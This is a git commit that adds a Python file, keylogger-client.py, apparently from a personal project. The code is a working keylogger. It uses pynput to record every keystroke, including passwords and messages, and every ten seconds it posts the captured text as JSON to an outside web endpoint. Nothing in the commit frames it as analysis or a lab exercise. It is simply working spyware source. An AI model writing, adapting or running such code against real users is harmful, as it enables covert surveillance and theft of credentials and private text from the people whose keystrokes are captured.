e7142b194a0402809b31bb1b08da7eab93d38e80
gfurri20 <geremia.furri@gmail.com>
2024-01-03 05:34:11 -0500

    created keylogger-client.py

---
+++ keylogger-client/keylogger-client.py
@@ -0,0 +1,45 @@
+from pynput import keyboard
+import json
+import requests
+import threading
+
+text = ""
+interval = 10
+
+addr = "https://mockup.free.beeceptor.com"
+
+def send_post_req():
+    # format captured keys and send
+    payload = json.dumps({"keyboardData" : text})
+    r = requests.post(addr, data=payload, headers={"Content-Type" : "application/json"})
+
+    # every n seconds send info to the server
+    timer = threading.Timer(interval, send_post_req)
+    timer.start() 
+
+# event listener for key pressed
+def on_press(key):
+    global text
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.alt:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("'")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    send_post_req()
+    listener.join()
